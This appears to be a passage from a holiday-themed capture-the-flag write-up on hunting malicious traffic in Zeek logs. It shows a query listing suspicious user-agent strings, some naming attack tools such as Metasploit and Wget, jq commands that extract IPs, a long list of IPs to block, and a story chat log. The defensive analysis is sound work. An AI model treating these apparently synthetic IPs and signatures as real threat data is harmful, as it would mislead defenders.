+"Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36"
+"Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12"
+"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1"
+"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1"
+----
++
+.New query
+[options="nowrap"]
+----
+user_agent.keyword("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr) AppleWebKit/412.6 (KHTML, like Gecko) Safari/412.2" OR "Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)" OR "CholTBAgent" OR "HttpBrowser/1.0" OR "Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N" OR "Mozilla/4.0 (compatible MSIE 5.0;Windows_98)" OR "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)" OR "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)" OR "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)" OR "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)" OR "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)" OR "Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)" OR "Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)" OR "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)" OR "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0)" OR "Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)" OR "Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )" OR "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)" OR "Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)" OR "Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)" OR "Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)" OR "Mozilla/4.0 (compatible; Metasploit RSPEC)" OR "Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6." OR "Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1" OR "Mozilla/5.0 (Windows NT 10.0;Win64;x64)" OR "Mozilla/5.0 (Windows NT 5.1 ; v.)" OR "Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0" OR "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13" OR "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731" OR "Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)" OR "Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)" OR "Mozilla/5.0 WinInet" OR "Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)" OR "Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)" OR "Opera/8.81 (Windows-NT 6.1; U; en)" OR "RookIE/1.0" OR "Wget/1.9+cvs-stable (Red Hat modified)" OR "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19" OR "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36" OR "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36" OR "Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30" OR "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12" OR "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1" OR "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1")
+----
++
+***** `90` hits for this search + the `15` ips from the user-agents list = `105` results!
+***** Save response to disk
+***** Extract IPs
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-12.Wdg]$ cat ips-bad-partial.json | jq -r '.hits.hits[]._source."id.orig_h"' | tee ips-bad-partial.txt | wc -l
+90
+----
++
+. Create final list of ips to submit
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-12.Wdg]$ echo "$(cat ips-bad-partial.txt ips-uas.txt | sort -u | tr '\n' ',' | sed -re 's|,$||')"
+0.216.249.31,10.122.158.57,10.155.246.29,102.143.16.184,103.235.93.133,104.179.109.113,106.132.195.153,10.61.51.10,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,118.26.57.38,121.7.186.163,123.127.233.97,126.102.12.53,129.121.121.48,131.186.145.73,13.39.153.254,135.203.243.43,135.32.99.116,140.60.154.239,142.128.135.10,148.146.134.52,150.45.133.97,158.171.84.209,162.234.176.133,168.66.108.62,173.37.160.150,179.88.120.25,180.246.147.152,185.19.7.133,186.28.46.179,187.152.203.243,187.178.169.123,190.245.228.38,19.235.69.221,200.75.228.240,203.68.29.5,208.14.190.102,217.132.156.225,220.132.33.81,2.230.60.70,223.149.180.133,22.34.153.164,2.240.116.254,225.191.220.138,226.102.56.13,226.240.188.154,227.110.45.126,229.133.163.235,229.229.189.246,230.246.50.221,231.179.108.238,23.49.177.78,238.143.78.114,238.36.255.223,249.237.77.152,249.34.9.16,249.90.116.138,250.22.86.40,252.122.243.212,253.182.102.55,253.65.40.39,27.88.56.114,28.169.41.122,29.0.183.220,31.116.232.143,3.1.192.132,31.254.228.4,34.129.179.28,34.155.174.167,37.216.249.50,42.103.246.130,42.103.246.250,42.127.244.30,42.16.149.112,42.191.112.181,44.164.136.41,44.74.106.131,45.239.232.245,48.66.193.176,49.161.8.58,50.154.111.0,53.160.218.44,53.55.225.83,56.5.47.137,61.110.82.125,65.153.114.120,66.116.147.181,68.115.251.76,69.221.145.150,75.73.228.192,80.244.147.207,81.14.204.154,83.0.8.119,84.147.231.129,87.195.80.126,9.206.212.33,92.213.148.0,95.166.116.45,97.220.93.190
+----
++
+. Create the DENY rules
++
+image::12/23-ban.png[]
+
+image::12/24-win.png[]
+
+==== Chat
+
+.Chat log
+----
+(The Tooth Fairy - PRE)
+- I’m the Tooth Fairy, the mastermind behind the plot to destroy the holiday season.
+- I hate how Santa is so beloved, but only works one day per year!
+- He has all of the resources of the North Pole and the elves to help him too.
+- I run a solo operation, toiling year-round collecting deciduous bicuspids and more from children.
+- But I get nowhere near the gratitude that Santa gets. He needs to share his holiday resources with the rest of us!
+- But, although you found me, you haven’t foiled my plot!
+- Santa’s sleigh will NOT be able to find its way.
+- I will get my revenge and respect!
+- I want my own holiday, National Tooth Fairy Day, to be the most popular holiday on the calendar!!!
+
+(Wunorse Openslae - PRE)
+- Wunorse Openslae here, just looking at some Zeek logs.
+- I'm pretty sure one of these connections is a malicious C2 channel...
+- Do you think you could take a look?
+- I hear a lot of C2 channels have very long connection times.
+- Please use jq to find the longest connection in this data set.
+- We have to kick out any and all grinchy activity!
+
+(Wunorse Openslae - PRE)
+- That's got to be the one - thanks!
+- Hey, you know what? We've got a crisis here.
+- You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data.
+- All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data!
+- I'm so flummoxed I can't even remember how to login!
+- Hmm... Maybe the Zeek http.log could help us.
+- I worry about LFI, XSS, and SQLi in the Zeek log - oh my!
+- And I'd be shocked if there weren't some shell stuff in there too.
+- I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall.
+- If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs.
+- The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route.
+- Try not to block many legitimate weather station IPs as that could also cause route calculation failure.
+- Remember, when looking at JSON data, jq is the tool for you!
+
+(Krampus - PRE)
+But there’s still time! Solve the final challenge in your badge by blocking the bad IPs at srf.elfu.org and save the holiday season!
+
+(Krampus - POST)
+- Congratulations on a job well done!
+- Oh, by the way, I won the Frido Sleigh contest.
+- I got 31.8% of the prizes, though I'll have to figure that out.
+
+(Santa - POST)
+- You did it! Thank you! You uncovered the sinister plot to destroy the holiday season!
+- Through your diligent efforts, we’ve brought the Tooth Fairy to justice and saved the holidays!
+- Ho Ho Ho!
+- The more I laugh, the more I fill with glee.
+- And the more the glee,
+- The more I'm a merrier me!
+- Merry Christmas and Happy Holidays.
+
+
+(The Tooth Fairy - POST)
+- You foiled my dastardly plan! I’m ruined!
+- And I would have gotten away with it too, if it weren't for you meddling kids!
+----
